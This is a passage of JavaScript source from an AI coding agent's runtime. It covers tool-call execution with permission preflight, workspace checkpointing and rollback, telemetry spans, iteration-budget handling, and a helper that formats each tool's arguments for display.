      // Record an error tool result so the assistant turn stays BALANCED — a
      // tool_call without its matching tool_result wedges strict providers
      // (Anthropic/Bedrock) on the very next request — and let the model recover
      // on the following iteration instead of the run dying on a recoverable
      // malformed call.
      if (typeof toolName !== "string" || !toolName) {
        const reason = "malformed tool call: missing function name";
        emitToolHookLifecycle({
          tool: "(unknown)",
          args: null,
          result: { error: reason },
          error: reason,
          sessionId: options.sessionId || null,
          turnId,
          toolUseId: call?.id || null,
          cwd: options.cwd || process.cwd(),
          emit: lifecycleHookEmitter,
        });
        toolBatchRecords.push({
          tool: "(unknown)",
          toolUseId: call?.id || null,
          failed: true,
        });
        yield {
          type: "tool-result",
          tool: "(unknown)",
          result: { error: reason },
          error: reason,
          tool_use_id: call?.id || null,
          turn_id: `${runId}:t${budget.consumed}`,
        };
        messages.push({
          role: "tool",
          content: `Error: ${reason}.`,
          tool_call_id: call?.id,
        });
        continue;
      }
      let toolArgs;

      try {
        toolArgs =
          typeof fn.arguments === "string"
            ? JSON.parse(fn.arguments)
            : fn.arguments;
      } catch {
        toolArgs = {};
      }

      // Capability and exact-path authority must settle before any checkpoint,
      // hook, or observationally stronger `tool-executing` event. The same
      // preflight runs again inside executeTool to prevent call-site drift.
      const earlyAuthorityDenial = preflightToolExecutionAuthority(
        toolName,
        toolArgs,
        toolContext,
      );
      if (earlyAuthorityDenial) {
        const resultStr = capToolResultString(
          safeStringifyToolResult(earlyAuthorityDenial),
        );
        const decision = permissionDecision(
          call.id,
          toolName,
          earlyAuthorityDenial,
        );
        yield {
          type: "tool-result",
          tool: toolName,
          result: earlyAuthorityDenial,
          error: earlyAuthorityDenial.error,
          tool_use_id: call.id,
          turn_id: `${runId}:t${budget.consumed}`,
          permission_decision_id: decision?.id || null,
          permission_decision: decision,
        };
        messages.push({
          role: "tool",
          content: resultStr,
          tool_call_id: call.id,
        });
        const failed = emitToolHookLifecycle({
          tool: toolName,
          args: toolArgs,
          result: earlyAuthorityDenial,
          error: earlyAuthorityDenial.error,
          sessionId: options.sessionId || null,
          turnId,
          toolUseId: call.id,
          cwd: options.cwd || process.cwd(),
          emit: lifecycleHookEmitter,
        });
        toolBatchRecords.push({
          tool: toolName,
          toolUseId: call.id,
          failed,
        });
        continue;
      }

      // Auto-checkpoint the work tree before a mutating tool (opt-in), so the
      // user can `cc checkpoint restore` back to just before this call.
      const cpId = await _autoCheckpointBeforeTool(
        toolContext,
        toolName,
        toolArgs,
      );
      if (cpId)
        yield {
          type: "checkpoint",
          id: cpId,
          tool: toolName,
          tool_use_id: call.id,
          turn_id: `${runId}:t${budget.consumed}`,
        };

      let managedCheckpointHandle = null;
      let managedCheckpointPreparationError = null;
      let workflowBinding = null;
      try {
        managedCheckpointHandle = beginManagedToolCheckpoint({
          enabled: toolContext.managedCheckpoint === true,
          broker,
          workspaceRoot: toolContext.cwd || process.cwd(),
          stateDir: toolContext.managedCheckpointStateDir || undefined,
          runId,
          taskKey: `${runId}:t${budget.consumed}:${call.id}:${toolName}`,
          toolName,
          toolArgs,
          externalToolExecutor:
            toolContext.externalToolExecutors?.[toolName] || null,
          unmanagedWriterReason:
            _managedCheckpointUncoveredWriterReason(toolContext),
          exclusions: toolContext.managedCheckpointExclusions || [],
        });
      } catch (error) {
        managedCheckpointPreparationError = error;
        yield {
          type: "managed-checkpoint-error",
          phase: "prepare",
          tool: toolName,
          error: error.message,
          code: error.code || null,
          coverage: "none",
          tool_use_id: call.id,
          turn_id: `${runId}:t${budget.consumed}`,
        };
      }
      let managedCheckpointSettled = managedCheckpointHandle?.skipped === true;
      let managedCheckpointSettlementAttempted = false;
      try {
        if (managedCheckpointHandle) {
          yield {
            type: "managed-checkpoint",
            phase: managedCheckpointHandle.skipped ? "unavailable" : "prepared",
            id: managedCheckpointHandle.checkpointId || null,
            transaction_id: managedCheckpointHandle.transactionId || null,
            tool: toolName,
            coverage: managedCheckpointHandle.skipped
              ? managedCheckpointHandle.coverage
              : managedCheckpointHandle.prepared?.coverage || "partial",
            reason: managedCheckpointHandle.reason || null,
            tool_use_id: call.id,
            turn_id: `${runId}:t${budget.consumed}`,
          };
        }

        // A preparation failure is a strict admission failure: the tool never
        // starts, so do not emit the observationally stronger `tool-executing`
        // event. Consumers use that event to bind hooks, telemetry and turns to
        // an actual invocation.
        if (!managedCheckpointPreparationError) {
          workflowBinding = _workflowToolEffectBinding(
            workflowEffectId,
            workflowEffectId ? (workflowChildEffectSequence += 1) : 0,
            call.id,
            toolName,
          );
          yield {
            type: "tool-executing",
            tool: toolName,
            args: toolArgs,
            tool_use_id: call.id,
            turn_id: `${runId}:t${budget.consumed}`,
            ...(workflowBinding || {}),
            ...(managedCheckpointHandle
              ? {
                  managedCheckpointBinding: managedToolCheckpointBinding(
                    managedCheckpointHandle,
                  ),
                }
              : {}),
          };
          // The event yield is a host persistence boundary. A detached child's
          // fatal usage write can settle while the consumer handles it; fence
          // the next (possibly provider-backed) tool immediately before start.
          try {
            _throwBackgroundUsageFailureState(backgroundUsageFailureState);
          } catch (backgroundFailure) {
            yield {
              type: "tool-result",
              tool: toolName,
              result: {
                error:
                  "Tool execution blocked by an authoritative background usage persistence failure",
              },
              error: "authoritative background usage persistence failure",
              tool_use_id: call.id,
              turn_id: `${runId}:t${budget.consumed}`,
              ...(workflowBinding || {}),
            };
            throw backgroundFailure;
          }
        }

        let toolResult;
        let toolError = null;
        // Per-span unified ids (P2 observability): a tool span carries its turn.id
        // (correlating with the model span of the same iteration), the provider's
        // tool_use.id (so a tool-result event can be tied back to its call), and —
        // when auto-checkpoint fired before a mutating tool — the checkpoint.id the
        // user could restore to. All normalized through buildTelemetryAttributes.
        // tool_arguments CONTENT is opt-in (--otlp-content): the alias key is only
        // present when explicitly enabled, so by default the field is omitted
        // entirely (byte-identical default OTLP), and even opted-in it's length-
        // capped by redactContent. Mirrors the run-level content.prompt opt-in.
        const toolContentOptIn = options.otlpIncludeContent === true;
        const toolIdAttrs = recorder
          ? buildTelemetryAttributes(
              {
                turnId: `${runId}:t${budget.consumed}`,
                toolUseId: call.id,
                checkpointId: cpId || undefined,
                ...(toolContentOptIn ? { toolArguments: toolArgs } : {}),
              },
              { includeContent: toolContentOptIn },
            )
          : null;
        if (managedCheckpointPreparationError) {
          toolError = managedCheckpointPreparationError.message;
          toolResult = {
            error: `[Managed checkpoint] Preparation failed; "${toolName}" was blocked before execution: ${managedCheckpointPreparationError.message}`,
            managedCheckpoint: {
              status: "not_started",
              coverage: "none",
              code: managedCheckpointPreparationError.code || null,
            },
          };
        } else {
          try {
            toolResult = await _withSpan(
              recorder,
              "agent.tool",
              { "tool.name": toolName, ...(toolIdAttrs || {}) },
              () =>
                executeTool(toolName, toolArgs, {
                  ...toolContext,
                  toolCallId: call.id,
                  turnId: `${runId}:t${budget.consumed}`,
                  ...(workflowBinding || {}),
                }),
              (span, r) => {
                span.setAttribute(
                  "tool.is_error",
                  !!(r && typeof r === "object" && r.error),
                );
                // permission.decision_id (P2): a GATED tool result carries a
                // `policy` (deny / ask-fail / host-block / sandbox); allow-path
                // tools execute with no distinct decision. Stamp a stable id
                // (derived from the call + gate, so it's recomputable from the
                // tool-result's policy + tool_call_id) plus the low-cardinality
                // decision, letting a blocked tool span be tied to its decision.
                const decision =
                  r && typeof r === "object"
                    ? permissionDecision(call.id, toolName, r)
                    : null;
                if (decision?.id) {
                  const permAttrs = buildTelemetryAttributes({
                    decisionId: decision.id,
                    "permission.decision": decision.decision,
                  });
                  if (permAttrs["permission.decision_id"]) {
                    span.setAttribute(
                      "permission.decision_id",
                      permAttrs["permission.decision_id"],
                    );
                  }
                  if (permAttrs["permission.decision"]) {
                    span.setAttribute(
                      "permission.decision",
                      permAttrs["permission.decision"],
                    );
                  }
                }
              },
              "tool_error",
            );
          } catch (err) {
            if (err?.runtimeLedgerPersistence === true) throw err;
            toolResult = {
              error: err.message,
              ...(workflowBinding
                ? {
                    code: "CC_WORKFLOW_NESTED_TOOL_EXECUTION_THROWN",
                    outcomeUnknown: true,
                  }
                : {}),
            };
            toolError = err.message;
          }
        }
        if (recorder) recorder.counter("agent.tool.calls", 1);

        if (managedCheckpointHandle) {
          const interrupted = signal?.aborted === true;
          const toolSucceeded =
            !interrupted &&
            !toolError &&
            !(toolResult && typeof toolResult === "object" && toolResult.error);
          try {
            managedCheckpointSettlementAttempted = true;
            const managedCheckpoint = settleManagedToolCheckpoint(
              managedCheckpointHandle,
              {
                success: toolSucceeded,
                reason: interrupted
                  ? "agent tool interrupted"
                  : toolError ||
                    (toolResult && typeof toolResult === "object"
                      ? toolResult.error
                      : null) ||
                    "agent tool failed",
              },
            );
            managedCheckpointSettled = true;
            if (toolResult && typeof toolResult === "object") {
              toolResult.managedCheckpoint = managedCheckpoint;
            }
            yield {
              type: "managed-checkpoint-settled",
              phase: managedCheckpoint?.skipped
                ? "unavailable"
                : toolSucceeded
                  ? "committed"
                  : "rolled_back",
              id: managedCheckpoint?.checkpointId || null,
              transaction_id: managedCheckpoint?.transactionId || null,
              evidence_digest:
                managedCheckpoint?.evidence?.evidenceDigest || null,
              coverage: managedCheckpoint?.coverage || "none",
              file_coverage: managedCheckpoint?.fileCoverage || "none",
              reason: managedCheckpoint?.reason || null,
              tool: toolName,
              tool_use_id: call.id,
              turn_id: `${runId}:t${budget.consumed}`,
            };
          } catch (checkpointError) {
            toolError = checkpointError.message;
            toolResult = {
              error: `[Managed checkpoint] ${checkpointError.message}. Manual recovery/adjudication is required before this workspace is reused.`,
              managedCheckpoint: {
                status: "recovery_required",
                coverage: "none",
                code: checkpointError.code || null,
                transactionId: checkpointError.transactionId || null,
                checkpointId: checkpointError.checkpointId || null,
                settlement: checkpointError.settlement || null,
                originalToolError:
                  toolResult && typeof toolResult === "object"
                    ? toolResult.error || null
                    : null,
              },
            };
            yield {
              type: "managed-checkpoint-error",
              phase: checkpointError.settlement || "settle",
              tool: toolName,
              error: checkpointError.message,
              code: checkpointError.code || null,
              transaction_id: checkpointError.transactionId || null,
              checkpoint_id: checkpointError.checkpointId || null,
              coverage: "none",
              recovery_required: true,
              tool_use_id: call.id,
              turn_id: `${runId}:t${budget.consumed}`,
            };
          }
        }

        throwIfAborted(signal);

        // Append budget warning to tool result so the LLM sees it
        const warningMsg = budget.toWarningMessage();
        // Cap an individual tool result so one giant output can't blow the
        // context — but tell the model when we cut it (no more silent
        // mid-content slice). See MAX_TOOL_RESULT_CHARS / capToolResultString.
        const resultStr = capToolResultString(
          safeStringifyToolResult(toolResult),
        );
        const toolContent = warningMsg
          ? `${resultStr}\n\n${warningMsg}`
          : resultStr;

        const decision = permissionDecision(call.id, toolName, toolResult);
        yield {
          type: "tool-result",
          tool: toolName,
          result: toolResult,
          error: toolError,
          tool_use_id: call.id,
          turn_id: `${runId}:t${budget.consumed}`,
          ...(workflowBinding || {}),
          permission_decision_id: decision?.id || null,
          permission_decision: decision,
        };

        const nestedOutcomeUnknown = _workflowNestedToolOutcomeUnknown(
          workflowBinding,
          toolName,
          toolResult,
        );
        if (nestedOutcomeUnknown) throw nestedOutcomeUnknown;

        messages.push({
          role: "tool",
          content: toolContent,
          tool_call_id: call.id,
        });
        const failed = emitToolHookLifecycle({
          tool: toolName,
          args: toolArgs,
          result: toolResult,
          error: toolError,
          sessionId: options.sessionId || null,
          turnId,
          toolUseId: call.id,
          cwd: options.cwd || process.cwd(),
          emit: lifecycleHookEmitter,
        });
        toolBatchRecords.push({
          tool: toolName,
          toolUseId: call.id,
          failed,
        });
      } finally {
        if (
          managedCheckpointHandle &&
          !managedCheckpointHandle.skipped &&
          !managedCheckpointSettled &&
          !managedCheckpointSettlementAttempted
        ) {
          try {
            managedCheckpointSettlementAttempted = true;
            settleManagedToolCheckpoint(managedCheckpointHandle, {
              success: false,
              reason:
                "agent event consumer closed before managed tool settlement",
            });
            managedCheckpointSettled = true;
          } catch (abandonError) {
            // Async-generator return() executes this finally. Propagate a
            // settlement failure so cancellation cannot silently strand a
            // PREPARED transaction or advertise recoverable/full evidence.
            abandonError.message = `managed checkpoint cancellation rollback failed: ${abandonError.message}`;
            // Intentionally override the generator's pending return(): a failed
            // rollback is security-relevant and must remain observable.
            // eslint-disable-next-line no-unsafe-finally
            throw abandonError;
          }
        }
      }
    }
    emitToolBatchHookLifecycle({
      records: toolBatchRecords,
      sessionId: options.sessionId || null,
      turnId,
      cwd: options.cwd || process.cwd(),
      parallel: false,
      emit: lifecycleHookEmitter,
    });
  }

  // Budget exhausted — flush any child usage the final iteration produced,
  // then yield exhaustion event + final message
  await _awaitBackgroundUsageSettlement(
    backgroundSubAgents,
    backgroundUsageFailureState,
  );
  yield* _drainSubAgentUsage(subAgentUsageSink);
  yield { type: "iteration-budget-exhausted", budget: budget.toSummary() };
  yield {
    type: "response-complete",
    content: `(Iteration budget exhausted — ${budget.toSummary()})`,
  };
  yield { type: "run-ended", runId, reason: "budget-exhausted" };
}

// ─── Format helpers ───────────────────────────────────────────────────────

export function formatToolArgs(name, args) {
  switch (name) {
    case "read_file":
      return args.path;
    case "write_file":
      return `${args.path} (${args.content?.length || 0} chars)`;
    case "edit_file":
      return args.path;
    case "edit_file_hashed":
      return `${args.path} @${args.anchor_hash}`;
    case "delete_file":
      return args.path;
    case "move_file":
      return `${args.path} → ${args.target_path}`;
    case "run_shell":
      return args.run_in_background
        ? `${args.command} (background)`
        : args.command;
    case "check_shell":
      return args.task_id
        ? `${args.task_id}${args.kill ? " (kill)" : ""}`
        : "list";
    case "git":
      return args.command;
    case "search_files":
      return args.pattern;
    case "code_intelligence":
      return args.action === "workspace_symbols"
        ? `${args.action} ${args.query || ""}`.trim()
        : `${args.action} ${args.file || ""}${args.line != null ? `:${args.line}:${args.col}` : ""}`.trim();
    case "list_dir":
      return args.path || ".";
    case "run_skill":
      return `${args.skill_name}: ${(args.input || "").substring(0, 50)}`;
    case "list_skills":
      return args.category || args.query || "all";
    case "run_code":
      return `${args.language} (${(args.code || "").length} chars)`;
    case "spawn_sub_agent":
      return `[${args.role}] ${(args.task || "").substring(0, 60)}`;
    case "search_sessions":
      return `"${(args.query || "").substring(0, 60)}"`;
    case "notify":
      return `${args.level || "info"}: ${(args.title || "").substring(0, 50)}`;
    case "publish_artifact":
      return `${args.kind || "other"}: ${(args.title || args.path || "").substring(0, 60)}`;
    case "browser_state":
      return `tab=${args.tab ?? 0} port=${args.port ?? 9222}${args.reload ? " reload" : ""}`;
    case "browser_act": {
      const kinds = Array.isArray(args.actions)
        ? args.actions.map((a) => a?.type).filter(Boolean)
        : [];
      const head = kinds.slice(0, 4).join(",");
      return `${kinds.length} action(s)${head ? `: ${head}` : ""}${kinds.length > 4 ? ",…" : ""} tab=${args.tab ?? 0} port=${args.port ?? 9222}`;
    }
    case "schedule":
      return args.action === "cron"
        ? `cron ${args.cron || ""}${args.timezone ? ` [${args.timezone}]` : ""}`.trim()
        : args.action === "monitor"
          ? `monitor ${(args.command || "").substring(0, 40)}`.trim()
          : args.action === "wakeup"
            ? `wakeup +${args.delay || "0s"}`
            : String(args.action || "");
    default:
      return JSON.stringify(args).substring(0, 60);
  }
}
